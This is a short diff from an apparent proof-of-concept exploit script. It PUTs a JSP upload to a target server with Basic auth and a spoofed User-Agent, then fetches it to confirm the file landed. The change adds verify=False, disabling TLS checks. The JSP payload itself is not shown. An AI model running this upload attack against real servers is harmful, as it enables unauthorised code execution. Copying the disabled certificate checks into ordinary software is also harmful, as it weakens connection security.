@@ -27,8 +27,8 @@ def poc(base):
     headers = {'Authorization': 'Basic %s}' % key, 'User-Agent': 'Mozilla/5.0 Gecko/20100101 Firefox/45.0'}
     put_data = JSP_UPLOAD if ENABLE_EXP else randomString(10)
     try:
-        res1 = requests.put(target, headers=headers, data=put_data, timeout=10)
-        res2 = requests.get(uri, headers=headers, timeout=10)
+        res1 = requests.put(target, headers=headers, data=put_data, timeout=10, verify=False)
+        res2 = requests.get(uri, headers=headers, timeout=10, verify=False)
         if res1.status_code == 204 and res2.status_code == 200:
             if ENABLE_EXP:
                 return uri
